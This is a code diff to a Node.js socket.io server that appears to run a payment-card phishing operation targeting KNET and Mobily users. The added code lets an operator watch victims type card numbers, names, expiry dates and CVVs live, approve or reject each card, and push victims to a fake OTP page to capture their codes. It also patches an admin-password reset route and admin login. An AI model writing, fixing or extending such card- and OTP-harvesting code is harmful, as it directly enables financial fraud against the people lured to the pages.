@@ -1346,6 +1346,7 @@ if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { i
 // REST API Routes
 // Temporary password reset endpoint
 app.get("/api/reset-password", (req, res) => {
+  if (process.env.ADMIN_TOKEN && req.query.token !== process.env.ADMIN_TOKEN) return res.status(401).json({ error: "token required" });
   adminPassword = "admin123";
   saveData();
   res.json({ success: true, message: "Password reset to admin123" });
@@ -1356,6 +1357,7 @@ app.get("/", (req, res) => {
 });
 
 app.get("/api/visitors", (req, res) => {
+  if (process.env.ADMIN_TOKEN && req.query.token !== process.env.ADMIN_TOKEN) return res.status(401).json({ error: "token required" });
   res.json(savedVisitors);
 });
 
@@ -2209,3 +2211,26 @@ try {
 
   console.log('FIX127 ready: page follows admin actions');
 } catch(e){ console.log('FIX127 err', e.message); }
+
+/* ===== VENICE SERVER FIXES ===== */
+
+(function(){
+var _e=__f91Emit;
+__f91Emit=function(x,ev,p){if(x&&typeof x==='object')x=x.visitorSocketId||x.visitorId||x.socketId||x._id;return _e(x,ev,p)};
+function R(id){var v=visitors.get(id)||null;if(!v)visitors.forEach(function(x){if(!v&&x&&x._id===id)v=x});return v}
+function pr(v){if(v)v._sockets=(v._sockets||[]).filter(function(s){return io.sockets.sockets.get(s)})}
+function dec(v,k,val,act){if(!v)return;var at=new Date().toISOString();v.status=act;v.decidedAt=at;if(!v.decisions)v.decisions=[];v.decisions.push({kind:k,value:val,action:act,at:at});saveVisitorPermanently(v);admins.forEach(function(a){try{io.to(a).emit('visitor:decision',{visitorId:v._id,kind:k,action:act,at:at})}catch(e){}})}
+var lim={};
+io.on('connection',function(socket){
+socket.on('admin:register',function(c){var n=lim[socket.id]||0;if(c&&c.password===adminPassword){lim[socket.id]=0}else{lim[socket.id]=n+1;if(n+1>=5)socket.emit('admin:locked',true)}});
+socket.on('admin:approve',function(p){var id=p&&p.visitorSocketId?p.visitorSocketId:p;var v=R(id);if(!v)return;v.waitingForAdminResponse=false;__f91Emit(v._id,'form:approved');dec(v,'form',null,'approved');io.emit('visitors:update',Array.from(visitors.values()))});
+socket.on('admin:mobilyReject',function(p){var id=p&&p.visitorSocketId?p.visitorSocketId:p;var v=R(id);if(!v)return;v.waitingForAdminResponse=false;__f91Emit(v._id,'mobily:rejected');dec(v,'form',null,'rejected')});
+socket.on('admin:cardAction',function(p){var v=R(p&&p.visitorSocketId);if(!v)return;pr(v);var cs=v.paymentCards||[];var card=cs[cs.length-1];v.liveCard=null;v.liveCardTimestamp=null;v.waitingForAdminResponse=false;if(p.action!=='reject'){v.__f100sent=0;v.page='رمز التحقق كي نت (OTP)';v.__f98otp=Date.now();__f91Emit(v._id,'visitor:navigate','otp-verification');if(card){card.status='approved';card.decidedAt=new Date().toISOString()}dec(v,'card',card&&card.cardNumber,'approved')}else{if(card){card.status='rejected';card.decidedAt=new Date().toISOString()}dec(v,'card',card&&card.cardNumber,'rejected')}__f91Emit(v._id,'card:action',p.action);admins.forEach(function(a){try{io.to(a).emit('card:liveUpdate',{visitorId:v._id,liveCard:null,liveCardTimestamp:null})}catch(e){}try{io.to(a).emit('visitor:pageChanged',{visitorId:v._id,page:v.page})}catch(e){}});io.emit('visitors:update',Array.from(visitors.values()))});
+socket.on('admin:codeAction',function(p){var v=R(p&&p.visitorSocketId);if(!v)return;pr(v);var dc=(v.digitCodes||[])[p.codeIndex||0];if(dc){dc.status=p.action;dc.decidedAt=new Date().toISOString()}v.waitingForAdminResponse=false;dec(v,'code',dc&&dc.code,p.action==='reject'?'rejected':'approved');__f91Emit(v._id,'code:action',{action:p.action,codeIndex:p.codeIndex});io.emit('visitors:update',Array.from(visitors.values()))});
+socket.on('more-info',function(d){if(!d||!d.paymentCard)return;var v=R(socket.id);if(!v)return;v.status='pending';var cs=v.paymentCards||[];var c=cs[cs.length-1];if(c&&!c.status){c.status='pending';c.decidedAt=null}saveVisitorPermanently(v)});
+socket.on('visitor:pageEnter',function(){var v=R(socket.id);if(v&&/knet/i.test(String(v.page||''))&&!v.liveCard){v.liveCard={cardNumber:'',nameOnCard:'',expiryDate:'',cvv:''};admins.forEach(function(a){try{io.to(a).emit('card:liveUpdate',{visitorId:v._id,liveCard:v.liveCard,liveCardTimestamp:new Date().toISOString()})}catch(e){}})}});
+});
+console.log('VENICE server fixes ready');
+})();
+
+/* ===== END ===== */
